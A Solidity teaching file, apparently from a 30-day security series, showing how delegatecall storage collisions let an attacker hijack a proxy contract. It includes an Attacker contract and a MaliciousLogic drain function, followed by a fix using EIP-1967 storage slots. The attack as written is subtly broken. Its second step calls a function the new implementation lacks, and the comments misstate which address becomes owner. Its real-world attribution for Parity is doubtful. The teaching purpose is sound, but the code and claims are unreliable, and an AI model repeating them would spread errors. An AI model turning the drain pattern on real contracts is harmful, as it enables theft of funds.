// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ================================================================
//  DAY 2 / 30 — DELEGATECALL STORAGE COLLISION
//  The $280M Bug Still Hiding in Proxy Contracts
// ================================================================
//
//  CONCEPT:
//  delegatecall runs foreign code inside YOUR storage context.
//  If the proxy and logic contract have different storage layouts,
//  a write in the logic contract silently corrupts the proxy's
//  critical variables — including the implementation pointer itself.
//
//  REAL WORLD:
//  → Parity Multisig Wallet     — $280M frozen forever  (Nov 2017)
//  → Audius Governance Proxy    — $6M stolen            (Jul 2022)
//  → Multiple upgradeable proxy hacks across DeFi
//
// ================================================================


// ================================================================
//  PART 1 — VULNERABLE  (Storage Layout Mismatch)
// ================================================================

/// @notice Proxy stores implementation address at slot 0.
contract VulnerableProxy {
    address public implementation; // slot 0  ← CRITICAL pointer
    address public owner;          // slot 1

    constructor(address _impl) {
        implementation = _impl;
        owner = msg.sender;
    }

    fallback() external payable {
        address impl = implementation;
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0  { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice ⚠️ MISMATCHED layout — slot 0 here is NOT the implementation.
///         When delegatecalled, writes to slot 0 overwrite proxy.implementation!
contract VulnerableLogic {
    address public pendingAdmin; // slot 0 ← COLLIDES with proxy.implementation
    address public admin;        // slot 1 ← COLLIDES with proxy.owner
    uint256 public value;        // slot 2

    // ⚠️ This writes to proxy's slot 0 = overwrites implementation pointer!
    function setPendingAdmin(address _admin) external {
        pendingAdmin = _admin;
    }

    // ⚠️ This writes to proxy's slot 1 = overwrites owner!
    function confirmAdmin() external {
        require(msg.sender == pendingAdmin, "Not pending admin");
        admin    = pendingAdmin;
        pendingAdmin = address(0);
    }

    function setValue(uint256 _value) external {
        value = _value;
    }
}

/// @notice Attacker hijacks the proxy in two calls.
contract Attacker {
    VulnerableProxy public proxy;

    constructor(address _proxy) {
        proxy = VulnerableProxy(payable(_proxy));
    }

    function attack() external {
        MaliciousLogic mal = new MaliciousLogic();

        // Step 1: "setPendingAdmin" executes inside proxy's storage context.
        //   pendingAdmin (slot 0 in logic) maps to implementation (slot 0 in proxy).
        //   → proxy.implementation is now address(mal)
        VulnerableLogic(address(proxy)).setPendingAdmin(address(mal));

        // Step 2: "confirmAdmin" writes slot 1 inside proxy's context.
        //   admin (slot 1 in logic) maps to owner (slot 1 in proxy).
        //   → proxy.owner is now msg.sender (attacker)
        VulnerableLogic(address(proxy)).confirmAdmin();

        // Proxy is fully hijacked:
        //   • All future calls route to MaliciousLogic
        //   • Attacker is the new owner
        //   • Original funds / state are unreachable
    }
}

contract MaliciousLogic {
    // Complete control — drain ETH, brick the contract, anything.
    function drain(address payable to) external {
        to.transfer(address(this).balance);
    }
}


// ================================================================
//  PART 2 — SECURE  (EIP-1967 Isolated Storage Slots)
// ================================================================
//
//  FIX:
//  Store the implementation and admin pointers at slots derived from
//  a keccak256 hash (EIP-1967). These slots are astronomically
//  unlikely to collide with any logic contract's sequential storage.
//
//  Standard slots (never change these — wallets & explorers rely on them):
//  • Implementation : keccak256("eip1967.proxy.implementation") - 1
//  • Admin          : keccak256("eip1967.proxy.admin")          - 1
//
// ================================================================

contract SecureProxy {
    // EIP-1967 implementation slot
    bytes32 private constant IMPL_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    // EIP-1967 admin slot
    bytes32 private constant ADMIN_SLOT =
        0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;

    event Upgraded(address indexed newImplementation);

    constructor(address _impl) {
        _setImpl(_impl);
        _setAdmin(msg.sender);
    }

    // ✅ Only admin can upgrade — implementation pointer lives at EIP-1967 slot
    function upgradeTo(address newImpl) external {
        require(msg.sender == _getAdmin(), "Not admin");
        _setImpl(newImpl);
        emit Upgraded(newImpl);
    }

    function getImplementation() external view returns (address) { return _getImpl(); }
    function getAdmin()          external view returns (address) { return _getAdmin(); }

    fallback() external payable {
        address impl = _getImpl();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0  { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function _getImpl() private view returns (address impl) {
        assembly { impl := sload(IMPL_SLOT) }
    }

    function _setImpl(address impl) private {
        assembly { sstore(IMPL_SLOT, impl) }
    }

    function _getAdmin() private view returns (address admin) {
        assembly { admin := sload(ADMIN_SLOT) }
    }

    function _setAdmin(address admin) private {
        assembly { sstore(ADMIN_SLOT, admin) }
    }
}

/// @notice ✅ Safe logic contract — its slot 0/1/2 never touch EIP-1967 slots.
contract SecureLogic {
    address public pendingAdmin; // slot 0  — harmless, no EIP-1967 collision
    address public admin;        // slot 1  — harmless
    uint256 public value;        // slot 2  — harmless

    function setPendingAdmin(address _admin) external {
        pendingAdmin = _admin;
    }

    function confirmAdmin() external {
        require(msg.sender == pendingAdmin, "Not pending admin");
        admin        = pendingAdmin;
        pendingAdmin = address(0);
    }

    function setValue(uint256 _value) external {
        value = _value;
    }
}

// ================================================================
//  KEY TAKEAWAYS
// ================================================================
//
//  ❌ VULNERABLE pattern:
//     • Proxy and logic share overlapping sequential storage slots
//     • Any logic write can silently corrupt proxy internals
//
//  ✅ SECURE pattern  (EIP-1967):
//     • Implementation & admin stored at pseudo-random keccak256 slots
//     • Logic contract's natural storage (slot 0, 1, 2…) never collides
//     • Use OpenZeppelin's TransparentUpgradeableProxy or UUPS — they
//       implement EIP-1967 out of the box
//
//  RULE OF THUMB:
//     If you're writing a custom proxy without EIP-1967, you're one
//     layout mismatch away from a $280M bug.
//
// ================================================================
